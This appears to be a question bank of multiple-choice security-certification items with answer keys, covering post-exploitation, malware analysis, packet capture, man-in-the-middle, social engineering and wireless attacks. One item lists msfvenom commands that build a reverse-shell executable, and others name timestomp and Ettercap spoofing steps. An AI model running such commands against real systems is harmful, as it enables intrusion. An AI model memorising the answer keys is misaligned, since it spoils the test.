index,question,options,answer_key
255,"Sarah, a penetration tester, has gained initial access to a Windows system. She wants to execute her custom payload without it appearing as a separate process in the task manager. She decides to disguise her payload by injecting it into a legitimate, running process. Which post-exploitation technique is Sarah employing to achieve this?","{'A': 'Rootkit installation', 'B': 'Process injection', 'C': 'Log obfuscation', 'D': 'File system hiding'}",B
256,"Alex, a security analyst, discovers that a malicious process is running within the database server's process space. To gain further access and blend in with legitimate system activity, Alex decides to migrate the compromised process to a less suspicious one. After successfully establishing a Meterpreter session, Alex uses the `run post/windows/manage/migrate` command. The output shows the initial process as 'NepqI.jsp (5624)' and the successful migration to process ID 6012, which is identified as Notepad.exe. What is the primary security benefit Alex is attempting to achieve by migrating the Meterpreter session to Notepad.exe?","{'A': 'To increase the network bandwidth consumed by the malicious process.', 'B': 'To ensure the malicious process runs with elevated SYSTEM privileges.', 'C': 'To evade detection by endpoint protection solutions by mimicking legitimate activity.', 'D': 'To automatically clear system event logs on the compromised server.'}",C
257,"Sarah, an attacker, has gained access to a Windows system and wants to hide a malicious executable. She knows that simply placing it in a common temporary directory might be too obvious. She recalls that the NTFS file system offers a feature that allows data to be associated with a file without being part of its main content, and this feature is often used to store file properties or for malicious purposes, remaining hidden from standard directory listings. Which feature would Sarah most likely utilize to hide her executable?","{'A': 'Dot files and dot directories', 'B': 'Volume shadow copies', 'C': 'Alternate Data Streams (ADS)', 'D': 'Temporary Internet Files'}",C
258,"An attacker named Alex has successfully uploaded a malicious executable, disguised as 'regedit.exe', onto a victim's Windows system using Meterpreter. Alex wants to ensure this malicious file blends in perfectly with legitimate system files. To achieve this, Alex needs to make the uploaded file's timestamps (creation, modification, and access) match those of the original Windows 'regedit.exe' file. Which Meterpreter command should Alex use to accomplish this task?","{'A': 'upload regedit.exe -o /windows/regedit.exe', 'B': 'timestomp regedit.exe -f /windows/regedit.exe', 'C': 'timestomp regedit.exe -m /windows/regedit.exe', 'D': 'upload regedit.exe --match-time /windows/regedit.exe'}",B
259,"Alex, a security analyst, discovers an unpatched vulnerability on an internal server. He successfully exploits it using a local exploit and gains a low-privileged shell. To further his investigation and access sensitive files, Alex needs elevated permissions. What is the primary objective Alex is attempting to achieve after exploiting the initial vulnerability?","{'A': 'Log manipulation', 'B': 'Privilege escalation', 'C': 'Persistence', 'D': 'Information gathering'}",B
260,"Alex, a penetration tester, has successfully gained access to a client's Windows server. To maintain persistence and exfiltrate sensitive data, Alex decides to use techniques to hide their presence. Which of the following methods, aligned with common post-exploitation techniques for evasion, would Alex likely employ to conceal their malicious activities?","{'A': 'Installing alternate data streams and Registry keys', 'B': 'Creating Registry keys and hidden processes', 'C': 'Hiding processes and files', 'D': 'Hiding files and Registry keys'}",C
261,"Sarah, a security analyst, is investigating a new malware sample. She observes that the malware infects executable files and, when these files are run, the malware reinfects the system. Even if she deletes the original infected executable, running another infected program leads to reinfection. What common characteristic of malware is Sarah observing in this scenario?","{'A': 'The malware is a worm, demonstrating self-propagation.', 'B': 'The malware is memory resident, allowing constant reinfection.', 'C': 'The malware exhibits the ability to reinfect the system upon execution of infected programs.', 'D': 'The malware is a logic bomb, triggered by a specific date and time.'}",C
262,"Sarah, a security analyst, is investigating a recent network incident where several internal servers began communicating excessively with each other, leading to a significant increase in network traffic and a slowdown in legitimate operations. She observes that the affected servers are now exhibiting unusual behavior, and the malware seems to be spreading independently without requiring user interaction on each infected machine. Which type of malware is Sarah most likely dealing with?","{'A': 'A Trojan horse that disguised itself as a legitimate application.', 'B': 'A virus that requires user execution to propagate.', 'C': 'A worm that exploits network vulnerabilities to self-propagate.', 'D': 'A rootkit designed to hide malicious activity.'}",C
263,"Alex, a security analyst, observes a phishing email containing an attachment disguised as an invoice. Upon opening the attachment, the user's system starts exhibiting unusual behavior, connecting to an unknown external IP address and sending out spam emails. Alex suspects the attachment initiated a process that allows an attacker to remotely control compromised systems. Which type of malware is most likely responsible for this observed behavior?","{'A': 'Ransomware, due to the encryption of files and demand for payment.', 'B': 'A Trojan horse, due to the deception used to trick the user into executing it.', 'C': 'A botnet client, due to its ability to connect to C&C infrastructure and facilitate malicious activities like sending spam.', 'D': 'A virus, because it replicated and spread to other systems on the network.'}",C
264,"Sarah, a cybersecurity analyst, is investigating a suspicious executable file. To understand its capabilities without risking her primary system, she sets up a virtual machine. After configuring the VM, she runs the executable and meticulously observes the changes it makes to the system's registry, file system, and network connections. What type of malware analysis is Sarah performing?","{'A': ""Static analysis, by examining the executable's code without running it."", 'B': 'Dynamic analysis, by running the malware and observing its behavior.', 'C': ""Reconnaissance, by mapping the target system's network topology."", 'D': 'Vulnerability scanning, by actively probing for weaknesses in the system.'}",B
265,"Alex, a security analyst, is investigating a suspicious executable file. He suspects it might be packed or encrypted. Using a tool, he examines the file's structure and notices that the executable section appears unusually small, with a larger section containing compressed or encrypted data. This observed characteristic is most indicative of the presence of what?","{'A': 'A Portable Executable (PE) file format', 'B': 'A valid section for initialized data (.data)', 'C': 'Malware employing packers or encryptors', 'D': 'A program compiled from C source code'}",C
266,"Alex, a malware analyst, is examining a suspicious executable. He notices that the executable has no discernible sections like .text or .data when analyzed in Cutter, and the entry point is labeled 'UPX1:entry0'. What tool would be most effective for Alex to confirm that the executable is packed and to identify the packer used?","{'A': 'Cutter, to analyze the disassembled code for obfuscation techniques.', 'B': ""PE Detective, to scan the executable's directory for packer signatures."", 'C': 'A debugger, to step through the decompressed code at the entry point.', 'D': 'A network sniffer, to observe any outbound communication during decompression.'}",B
267,"Alex, a malware analyst, is examining a suspicious executable file. He suspects it might be a known piece of malware. To quickly identify it without running the code, he decides to generate a unique fingerprint for the file that can be compared against online databases. Which of the following methods would Alex likely use for this initial static analysis step?","{'A': 'Disassembling the code in Cutter to understand the mov and lea operations.', 'B': ""Examining the file's metadata, looking for copyright information and the 'Details' tab."", 'C': 'Obtaining a hash of the sample, such as MD5, and submitting it to VirusTotal.', 'D': ""Using the 'call' mnemonic to trace potential function calls within the executable.""}",C
268,"Sarah, a security analyst, is investigating a suspicious executable file found on a user's machine. To quickly check if this file is known malware without executing it, she decides to generate a digital fingerprint. She runs a command on her Windows system that produces a unique string representing the file's content. This string is then used to query online databases of known malware signatures. What common hashing algorithm did Sarah most likely use for this initial static analysis step?","{'A': 'SHA-256', 'B': 'MD5', 'C': 'SHA-1', 'D': 'N-gram Hashing'}",B
269,"Alex, a security researcher, wants to analyze a suspicious executable file without risking his primary workstation. He needs a tool that can automatically execute the sample within a virtualized environment, monitor its behavior like registry changes and network connections, and provide a detailed report. Which tool is best suited for Alex's needs based on the provided context?","{'A': 'Using VM snapshots to manually compare system states before and after execution.', 'B': 'Cuckoo Sandbox to automate the execution, analysis, and reporting.', 'C': 'Leveraging malwr.com for online hash checking without executing the sample.', 'D': 'Employing a hypervisor like KVM without an analysis framework.'}",B
270,"Sarah, a malware analyst, is examining a suspicious executable. She suspects it might perform actions like capturing screenshots or logging recent files. She runs the sample in Cuckoo Sandbox and reviews the analysis logs. She notices entries indicating the startup of modules named 'Screenshots' and 'RecentFiles', along with a successful execution of 'bogus.exe' and a memory dump of its process. What is Sarah primarily observing in this scenario?","{'A': 'The results of a debugger analyzing the opcode execution of the malware.', 'B': ""The direct analysis of the malware's source code within an IDE."", 'C': 'The actions and artifacts generated by the malware during its execution within an automated sandbox.', 'D': ""The network traffic patterns observed from the malware's communication.""}",C
271,"Sarah, a malware analyst, is examining a suspicious executable. She loads it into OllyDbg and wants to understand its execution flow and identify where the program begins its critical operations. After loading, she notices the program runs to completion without any visible output. To analyze its behavior step-by-step, she needs to pause execution at the very beginning. What is the most effective method Sarah can use within OllyDbg to achieve this?","{'A': ""Utilize the graph view to visually trace the program's pathways."", 'B': 'Set a breakpoint at the entry point of the program by examining the call stack after running it once.', 'C': 'Analyze the hex dump to identify the starting byte sequence.', 'D': 'Step through the program one operation at a time without setting any breakpoints.'}",B
272,"An ethical hacker named Sarah is analyzing a malicious executable. She observes assembly code that repeatedly calls `msvcrt.dll!set_app_type` and `msvcrt.dll!iob_1b0`. Sarah suspects these calls are part of the malware's attempt to establish persistence or manipulate its execution environment. Based on the context, what is the primary benefit of these functions being called by name using labels?","{'A': 'It allows the malware to dynamically load additional modules from system directories without prior knowledge.', 'B': ""It makes it easier for Sarah to understand the malware's behavior by providing clear identifiers for the library functions being invoked."", 'C': 'It enables the malware to bypass signature-based detection by obfuscating the underlying library calls.', 'D': ""It automatically registers the malware with the operating system's startup routines for persistent execution.""}",B
273,"Sarah, a penetration tester, is examining a simple C program designed to establish a network connection. She observes that the program includes the `<sys/socket.h>` and `<netinet/in.h>` headers and utilizes functions like `socket()`, `connect()`, and `send()`. After receiving data from a remote listener, the program passes this data directly to the `system()` function. What is the primary security risk associated with this program's handling of received data?","{'A': 'Buffer overflow due to improper input validation before storing data in the `buffer` array.', 'B': ""Command injection, as arbitrary commands received from the remote listener can be executed on the client's system."", 'C': 'Denial of service by overwhelming the socket with too many incoming connections.', 'D': 'Information disclosure because the program hardcodes sensitive IP addresses for communication.'}",B
274,"Alex, a penetration tester, needs to establish a reverse shell connection from a target Linux system back to his attacking machine. He has identified that outbound connections are more likely to be allowed through the target's firewall. To achieve this, Alex decides to use `msfvenom` to craft a Linux executable. Which command would Alex use to generate a 32-bit Linux ELF executable that connects back to his machine on IP address 127.0.0.1 and port 4444 using a reverse TCP shell?","{'A': 'msfvenom -a x86 -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=4444 -f elf -o shell.elf', 'B': 'msfvenom -a x64 -p windows/x64/shell_reverse_tcp lhost=127.0.0.1 lport=4444 -f exe -o shell.exe', 'C': 'msfvenom -a x86 -p windows/x86/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -f elf -o shell.elf', 'D': 'msfvenom -a x86 -p linux/x86/shell_reverse_tcp lhost=192.168.1.100 lport=4444 -f elf -o shell.elf'}",A
275,"Sarah, a penetration tester, has successfully deployed a reverse shell on a target machine using a custom Linux executable. She receives a directory listing of the user's home directory, showing files like 'client.c', 'payload', and 'request.ps1'. She wants to make her 'payload' file less detectable by antivirus software. What technique demonstrated in the context should Sarah employ to achieve this?","{'A': 'Utilize netcat in listener mode to establish a connection and view the compromised directory.', 'B': 'Employ msfvenom with an encoder to obfuscate the payload before execution.', 'C': 'Set up a command and control (C2) server using Node.js to manage the compromised system.', 'D': 'Execute the payload multiple times in the same directory to overwhelm security software.'}",B
276,"Alex, a penetration tester, needs to quickly set up a Command and Control (C2) server to host commands for compromised endpoints. He wants to use a technology that allows for easy creation of web services with application-like functionality using JavaScript. He decides to use a specific library on top of this technology to manage the server communications and create responses for endpoint calls, such as '/check'. Which combination of technology and library is Alex most likely using for this task?","{'A': 'IIS with ASP.NET', 'B': 'Apache with PHP', 'C': 'Node.js with Express', 'D': 'Nginx with Python'}",C
277,"Alex, a penetration tester, is tasked with simulating an attack scenario to test a company's defenses. He needs to create a benign executable that mimics the behavior of malware to see if the security team can detect it. Considering that the target environment is primarily Windows and Python might not be readily available, which programming language would be a good choice for Alex to develop his custom executable?","{'A': ""Python, as it's versatile and widely used."", 'B': 'Java, because it offers cross-platform compatibility.', 'C': 'C, as compiled programs generally work without external interpreters.', 'D': ""JavaScript, since it's prevalent in web applications.""}",C
278,"Alex, a security analyst, is investigating a suspicious executable. To understand its behavior in a controlled environment without actually running it on his primary system, he decides to execute it within a sandboxed setting designed specifically for observing malware's actions and effects. Which tool would be most appropriate for Alex to use in this scenario?","{'A': 'IDA Pro', 'B': 'Cuckoo Sandbox', 'C': 'Metasploit', 'D': 'VirusTotal'}",B
279,"Alex, a security analyst, is tasked with investigating suspicious network activity within a switched network. He suspects that sensitive data is being transmitted. Alex wants to capture all network traffic passing through his interface, not just traffic addressed to his specific machine, to analyze it for potential breaches. What mode must Alex enable on his network interface card (NIC) to achieve this?","{'A': 'Broadcast mode', 'B': 'Promiscuous mode', 'C': 'Monitored mode', 'D': 'Encrypted mode'}",B
280,"Sarah, a network analyst, is investigating unusual network activity on a Linux system. She needs to capture network traffic and store it in a file for later analysis. She is particularly interested in seeing the raw IP addresses and port numbers without any name resolution to reduce noise. Which command-line utility should she use, and what option is crucial for disabling name resolution?","{'A': 'Wireshark, using the ""Resolve Names"" filter.', 'B': 'tcpdump, using the ""-n"" option.', 'C': 'Nmap, with the ""--script"" parameter.', 'D': 'Netcat, redirecting output to a file.'}",B
281,"Sarah, a network analyst, is investigating unusual network traffic on a Linux system. She suspects a device on her network is attempting to locate other devices using a discovery protocol. To capture and analyze this traffic without trying to resolve IP addresses to hostnames, which command would she execute?","{'A': 'tcpdump -v', 'B': 'tcpdump -vv -s 0', 'C': 'tcpdump -n', 'D': 'tcpdump -vv'}",C
282,"Alex, a security analyst, is investigating suspicious network activity on the 'quiche.lan' network. He observes a series of DNS queries and responses, particularly PTR queries. He wants to examine the raw packet data, including both the hexadecimal representation and the ASCII decode of the payload for these UDP packets. Which tcpdump command-line option should Alex use to achieve this?","{'A': 'tcpdump -i eth0 -v', 'B': 'tcpdump -i eth0 -X', 'C': 'tcpdump -i eth0 -r', 'D': 'tcpdump -i eth0 -n'}",B
283,"Alex, a security analyst, is investigating unusual network activity. He suspects a compromise and wants to capture all network traffic passing through the 'eth0' interface on a target server to analyze it later. He needs to save this captured data to a file for detailed examination. Which command-line option should Alex use with `tcpdump` to achieve this?","{'A': 'tcpdump -i eth0 -v', 'B': 'tcpdump -r capture.pcap', 'C': 'tcpdump -w capture.pcap -i eth0', 'D': 'tcpdump -i eth0 -vv'}",C
284,"An analyst, Alex, is investigating suspicious network activity. He wants to examine specific details from captured packets, including the frame number, source IP, destination IP, IP Type of Service, and IP Time To Live. Which command-line tool, as described in the context, would Alex use to extract and display only these specific fields from a packet capture?","{'A': 'tcpdump with detailed output filters', 'B': ""Wireshark's GUI to manually select columns"", 'C': 'tshark with the -Tfields and -e flags', 'D': 'windump to capture and analyze packets'}",C
285,"Sarah, a penetration tester, is analyzing network traffic and suspects a TLS-encrypted communication. She has obtained the RSA private key for the server involved. Which feature within Wireshark should Sarah utilize to decrypt the captured TLS traffic, enabling her to read the intercepted messages?","{'A': 'The capture filter to restrict incoming traffic.', 'B': 'The display filter to selectively view packets.', 'C': 'The RSA keys preference to input the private key.', 'D': 'The protocol decode pane to examine individual fields.'}",C
286,"Alex, a penetration tester, is connected to a target network via SSH and wants to capture only DNS traffic. He is concerned that the high volume of SSH traffic will obscure the DNS packets. Which command, using a BPF primitive, would be most effective for Alex to filter out the SSH traffic and focus solely on DNS requests?","{'A': 'tcpdump udp and port 53', 'B': 'tcpdump not port 22', 'C': 'tcpdump tcp or udp', 'D': 'tcpdump ip and proto 17'}",A
287,"Alex, a penetration tester, needs to capture only TCP traffic between his machine (192.168.86.1) and a target server. He uses the following command: `tcpdump tcp and (host 192.168.86.1)`. After reviewing the output, he sees SYN, SYN-ACK, ACK, and FIN packets exchanged between the two hosts. What type of filter did Alex utilize with tcpdump?","{'A': 'A promiscuous mode filter that captures all traffic on the network interface.', 'B': 'A capture filter that limits the traffic saved to the capture file based on specified criteria.', 'C': 'A decoding filter applied within Wireshark to analyze specific protocols.', 'D': 'A network segmentation filter configured on the switch to isolate traffic.'}",B
288,"Alex, a security analyst, is reviewing a Wireshark capture from a compromised web server. He suspects unusual communication patterns and wants to isolate and examine the complete back-and-forth traffic between the client and server for a specific HTTP session. Which Wireshark feature should Alex utilize to achieve this?","{'A': 'Protocol Hierarchy statistics to identify the most prevalent protocols.', 'B': 'The Conversations view to list all endpoint interactions.', 'C': ""Right-clicking a packet and selecting 'Follow TCP Stream' to isolate the session's data."", 'D': 'Adjusting the color rules to highlight frames with errors.'}",C
289,"Alex, a security analyst, is examining a network traffic capture and notices several anomalies flagged by Wireshark, such as unexpected protocol behavior and malformed packets. He wants to quickly review all the frames that Wireshark has identified as problematic without manually sifting through the entire capture. Which Wireshark feature should Alex use to achieve this?","{'A': 'Conversations statistics', 'B': 'Expert Information', 'C': 'Protocol decode', 'D': 'Time column analysis'}",B
290,"Sarah is attempting an ARP spoofing attack on a local network to intercept traffic. She uses a tool that allows her to specify two IP addresses to impersonate, enabling her to sit between two communicating hosts. The tool also automatically sends gratuitous ARP responses to keep the ARP cache entries fresh. Which tool is Sarah most likely using for this task?","{'A': 'Fragroute', 'B': 'Ettercap', 'C': 'Arp-spoof', 'D': 'Tcpdump'}",C
291,"Sarah, a security analyst, is attempting to capture credentials by intercepting traffic between a user's workstation and a domain controller on their network. She has successfully launched Ettercap, scanned the network, and identified the IP addresses of both the workstation and the domain controller. To facilitate the interception of traffic flowing between these two specific machines, what subsequent action should Sarah take within Ettercap?","{'A': 'Initiate a DNS spoofing attack by creating a custom etter.dns configuration file.', 'B': 'Select the ARP Spoof option from the MitM menu and assign the workstation to Target 1 and the domain controller to Target 2.', 'C': ""Configure Ettercap to capture packets directly on the system's primary network interface without targeting specific hosts."", 'D': 'Use the host list to conduct a port scan on both the workstation and the domain controller to identify open services.'}",B
292,"Alex, a security analyst, is simulating an attack using Ettercap. He has configured the `/etc/ettercap/etter.dns` file to redirect `www.foo.com` to `192.168.86.57` and enabled the DNS spoof plugin after initiating an ARP spoof. He observes log entries indicating that a DNS request for `browser.pipe.aria.microsoft.com` is being spoofed to `107.170.40.56`. What is the primary technique Alex is using to redirect the DNS traffic?","{'A': 'ARP poisoning to redirect traffic to his machine and then using a custom DNS server.', 'B': 'Man-in-the-middle attack using SSL stripping to intercept DNS queries.', 'C': 'DNS cache poisoning on the target machine to alter DNS records.', 'D': 'Utilizing a DHCP server to assign incorrect DNS server addresses to clients.'}",A
293,"Sarah, a penetration tester, is performing a man-in-the-middle attack against a user browsing a website. She has already established an ARP spoof to redirect traffic. She notices that the user is still communicating over HTTPS, which prevents her from easily reading the traffic. To facilitate her analysis, Sarah configures Ettercap to intercept and downgrade HTTPS connections to HTTP. What technique is Sarah employing to gain visibility into the user's traffic?","{'A': 'DNS Spoofing to redirect traffic to a malicious DNS server.', 'B': 'SSL Stripping to remove encryption from HTTPS connections.', 'C': 'Packet Sniffing at the Data Link layer to capture frames.', 'D': 'ARP Poisoning to intercept network traffic.'}",B
294,"Alex, a security analyst, is tasked with monitoring network traffic for suspicious activity on a segment of the corporate network where he does not have direct physical access to the switch. To capture all traffic flowing through a specific port on that switch, Alex needs to configure the switch to duplicate the traffic. What switch functionality, as described in the context, would Alex use to achieve this?","{'A': 'ARP Spoofing', 'B': 'DNS Spoofing', 'C': 'Port Mirroring (SPAN)', 'D': 'SSL Stripping'}",C
295,"Alex, a penetration tester, is examining network traffic related to a web application. He notices that the analysis is showing a high percentage of SSL traffic. To better understand the communication, Alex wants to convert the encrypted SSL traffic into unencrypted traffic for easier inspection. What tool's functionality is he attempting to utilize in this scenario?","{'A': 'sslstrip', 'B': 'Ettercap', 'C': 'tcpdump', 'D': ""Wireshark's Protocol Hierarchy""}",A
296,"Sarah, a cybersecurity analyst, is investigating a phishing campaign targeting her company. She observes that the attackers are impersonating the IT department and are offering a free software upgrade to employees who click a link. After clicking, users are prompted to log in with their company credentials on a page that closely mimics the company's legitimate portal. This technique relies on which of Robert Cialdini's principles of influence?","{'A': 'Scarcity', 'B': 'Authority', 'C': 'Liking', 'D': 'Reciprocity'}",B
297,"Sarah, a social engineer, wants to gain access to a victim's corporate credentials. She crafts a story where she poses as a representative from the company's help desk, claiming to have noticed numerous suspicious login attempts on the victim's account and expressing concern for their personal information due to prevalent credit card theft. Sarah hopes this fabricated scenario, designed to make the victim feel indebted and concerned, will lead them to trust her enough to offer their password for 'confirmation' or 'change'. What is the primary social engineering technique Sarah is employing with this approach?","{'A': 'Phishing, by using a fabricated email to trick the user into revealing information.', 'B': 'Pretexting, by creating a plausible story or excuse to establish contact and elicit desired actions.', 'C': 'Baiting, by offering something enticing to lure the victim into a trap.', 'D': 'Tailgating, by physically following an authorized person into a restricted area.'}",B
298,"Sarah, a social engineer, wants to impersonate a delivery driver to gain physical access to a secure office building. She plans to create a fake uniform and a convincing story about delivering a package that requires a signature from an employee on a specific floor. Which social engineering vector is Sarah primarily employing to achieve her objective?","{'A': 'Vishing', 'B': 'Smishing', 'C': 'Phishing', 'D': 'Impersonation'}",D
299,"Alex, a penetration tester, is targeting a financial institution. He observes employees entering the building and notices that when someone badges in, the door remains unlocked for a few seconds, allowing others to follow closely behind. Alex successfully uses this technique to gain entry himself. What social engineering technique did Alex employ?","{'A': 'Baiting', 'B': 'Tailgating', 'C': 'Quid pro quo', 'D': 'Phishing'}",B
300,"Alex, a social engineer, observes a building entrance with a revolving door. He notices that employees must swipe their badges to activate the door, and only one person can enter at a time. Alex also sees that the handicapped entrance next to it stays open for a longer duration after a badge swipe. He needs to gain entry without a badge, and observing the revolving door's design, which method would be most effective for him to exploit to bypass the physical security control?","{'A': 'Attempting to tailgate behind a legitimate employee through the handicapped entrance.', 'B': 'Using badge cloning on the revolving door reader.', 'C': 'Exploiting the longer dwell time of the handicapped door to follow someone through.', 'D': 'Convincing a guard to manually open the revolving door.'}",C
301,"Sarah, a social engineer, wants to gain access to a secure facility. She knows the facility uses fingerprint scanners as a primary physical access control. While researching, she learns that some fingerprint scanners can be fooled by a high-resolution replica of a print. To improve security, a common countermeasure is to incorporate body temperature as an additional verification factor. What biometric authentication method does Sarah's research suggest is vulnerable to a physical replica if not augmented with additional security measures?","{'A': 'Iris scanning', 'B': 'Retinal scanning', 'C': 'Voiceprint', 'D': 'Fingerprint scanning'}",D
302,"Alex, a penetration tester, notices a USB drive in the company parking lot labeled 'Payroll_Info_2023'. He recalls training that highlights the human tendency to be curious about free or sensitive information. He plans to insert this USB into his company laptop to see what data is present. Based on the described social engineering techniques, what is Alex attempting to exploit?","{'A': 'Pretexting by creating a believable scenario.', 'B': 'Baiting by offering a tempting item.', 'C': 'Phishing by impersonating a trusted entity.', 'D': 'Quid pro quo by offering something in return for information.'}",B
303,"Sarah, a security analyst, receives an email that appears to be from her bank, Wells Fargo. The email claims her account has been compromised and provides a link to verify her login details. While the email uses convincing graphics and tone, Sarah hovers over the link and notices the URL doesn't match the official Wells Fargo website. She also observes that the sender's email address is unusual. What type of social engineering attack is Sarah most likely experiencing?","{'A': ""A denial-of-service (DoS) attack aimed at overwhelming her bank's servers."", 'B': 'A man-in-the-middle (MitM) attack attempting to intercept her credentials.', 'C': 'A phishing attack designed to steal her authentication information.', 'D': 'A ransomware attack disguised as a security alert.'}",C
304,"An attacker named Alex wants to create a convincing phishing campaign. He decides to clone a popular online banking website to trick users into entering their credentials. He uses a tool to download only the essential HTML code from the legitimate site, allowing media files to be loaded from their original locations. This technique makes his cloned site appear more credible to unsuspecting users. Which of the following tools could Alex have used to download the necessary HTML code?","{'A': 'Nmap', 'B': 'Metasploit Framework', 'C': 'WinHTTrack', 'D': 'Wireshark'}",C
305,"An attacker, Sarah, wants to host a cloned version of a popular website to trick users. She registers a domain name that is a common misspelling of the legitimate site's URL. She then uses a command-line tool to download the entire content of the legitimate website to her server. Which of the following tools did Sarah most likely use to download the website's content?","{'A': 'Nmap', 'B': 'Wireshark', 'C': 'wget', 'D': 'cURL'}",C
306,"Sarah, a penetration tester, is tasked with assessing the security of a company's internal web server. She crafts an HTML fragment that includes an `<applet>` tag. This tag points to a Java archive (JAR) file named 'hkFKIKkhSvSHss.jar' and specifies a reverse connection back to her listening IP address via the '1' parameter. What type of web-based attack is Sarah most likely conducting?","{'A': 'Phishing attack', 'B': 'Watering hole attack', 'C': 'Denial-of-service attack', 'D': 'SQL injection attack'}",B
307,"Sarah, a penetration tester, is tasked with assessing the security of a corporate wireless network. She decides to employ a tool that automates the process of creating a rogue access point and then using deauthentication frames to force clients to connect to it, potentially to capture credentials or install malicious software. She observes the tool setting up a DHCP server and iptables to facilitate the rogue access point's operation. Which tool is Sarah most likely using for this wireless social engineering attack?","{'A': 'Metasploit Framework', 'B': 'Social-Engineer Toolkit (SET)', 'C': 'Hostapd', 'D': 'Wifiphisher'}",D
308,"Sarah, a penetration tester, wants to simulate a targeted phishing campaign against a small group of executives. She needs to deliver a custom payload via email that exploits a known vulnerability in a commonly used document format. Which Social-Engineer Toolkit (SET) attack vector and subsequent payload creation method should Sarah prioritize to achieve this?","{'A': 'Website Attack Vectors, followed by creating a Metasploit listener.', 'B': 'Spear-Phishing Attack Vectors, followed by selecting a FileFormat exploit and a Meterpreter payload.', 'C': 'Infectious Media Generator, using a custom EXE to VBA payload.', 'D': ""Powershell Attack Vectors, then selecting the 'Create a Payload and Listener' option.""}",B
309,"Sarah, a penetration tester, wants to gain unauthorized physical access to a secure office building. She plans to impersonate an employee to bypass security. After successfully convincing an employee to hold the door open for her, she enters the building. What social engineering technique did Sarah primarily use to gain physical access?","{'A': 'Vishing', 'B': 'Smishing', 'C': 'Tailgating', 'D': 'Typo-squatting'}",C
310,"Sarah, a penetration tester, needs to create a rogue wireless access point to intercept credentials from unsuspecting users. She wants to automate the process of setting up this fake access point. Which tool mentioned in the context would be most effective for this task?","{'A': 'The SET (Social-Engineer Toolkit)', 'B': 'httclone', 'C': 'wifiphisher', 'D': 'curl-get'}",C
311,"Sarah, a security analyst, is investigating a network breach. She discovers that the attacker, operating from a location with physical proximity to the target facility, was able to intercept sensitive data by capturing radio wave transmissions. The context suggests that this type of attack leverages the inherent properties of which wireless technology, enabling unauthorized access as long as the attacker is within range?","{'A': 'Bluetooth, due to its use of radio waves for short-range communication.', 'B': 'Wi-Fi (802.11), as it utilizes radio waves for network connectivity that can be intercepted.', 'C': 'NFC (Near Field Communication), relying on radio frequency identification for proximity-based data exchange.', 'D': 'Zigbee, a low-power wireless standard often used for IoT devices, which also uses radio waves.'}",B
312,"Alex, a penetration tester, is trying to capture wireless traffic from a building. He notices that the Wi-Fi signal is strong enough to be detected outside a window. To maximize his chances of capturing raw wireless frames, including radio headers, what mode should he enable on his wireless interface?","{'A': 'Promiscuous mode', 'B': 'Monitor mode', 'C': 'Ad hoc mode', 'D': 'Infrastructure mode'}",B
313,"Sarah, a security analyst, is investigating potential unauthorized devices on her company's Wi-Fi. She uses Wireshark in monitor mode on her wireless interface to capture all radio traffic. She observes a lot of network chatter and notices that clients are sending out messages to discover available networks. What is the primary purpose of these client messages in identifying wireless networks?","{'A': 'To send beacon frames that announce the presence of the network.', 'B': 'To initiate the association process with a specific access point.', 'C': 'To send probe requests to identify available service set identifiers (SSIDs).', 'D': 'To perform user-level authentication using the IEEE 802.1X standard.'}",C
314,"Sarah, a penetration tester, is tasked with assessing the security of a corporate wireless network. She discovers the network is using an older encryption standard that concatenates a pre-shared key with an initialization vector before feeding it into the RC4 algorithm. She observes that by collecting enough encrypted traffic, she can determine the encryption key. What legacy encryption protocol is Sarah most likely targeting?","{'A': 'Wi-Fi Protected Access (WPA)', 'B': 'Wi-Fi Protected Setup (WPS)', 'C': 'Wired Equivalent Privacy (WEP)', 'D': 'Extensible Authentication Protocol (EAP)'}",C
315,"Alex, a penetration tester, is targeting a corporate network that uses WPA2 for wireless security. He observes that the network relies on individual user credentials for access rather than a shared password. To gain access and demonstrate the security posture, Alex needs to exploit a vulnerability that bypasses the typical user authentication. Considering the WPA2 authentication methods described, which approach would Alex likely attempt to exploit if he aimed to authenticate as a specific user with their credentials?","{'A': 'Exploiting a flaw in the WPS PIN to gain access to the pre-shared key.', 'B': ""Leveraging a vulnerability in the RC4 stream cipher's initialization vector to derive the network key."", 'C': 'Targeting the Extensible Authentication Protocol (EAP) variations used in Enterprise authentication to compromise user credentials.', 'D': ""Manipulating the four-way handshake's nonces to impersonate a legitimate client.""}",C
